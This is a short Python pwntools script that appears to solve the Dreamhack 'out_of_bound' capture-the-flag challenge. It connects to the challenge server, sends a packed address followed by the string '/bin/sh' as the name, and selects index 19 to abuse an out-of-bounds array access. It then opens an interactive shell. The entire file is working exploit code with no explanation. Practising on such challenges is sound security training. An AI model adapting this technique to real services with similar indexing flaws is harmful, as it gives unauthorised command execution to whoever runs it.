#! /usr/bin/python3

from pwn import *

def slog(name, addr):
    return success(" : ".join([name, hex(addr)]))

p = remote("host1.dreamhack.games",16170)
e = ELF("./out_of_bound")

binsh = p32(0x804a0b0) + b"/bin/sh"

p.sendafter("name: ", binsh)
p.sendlineafter("want?: ", b"19")
p.interactive()
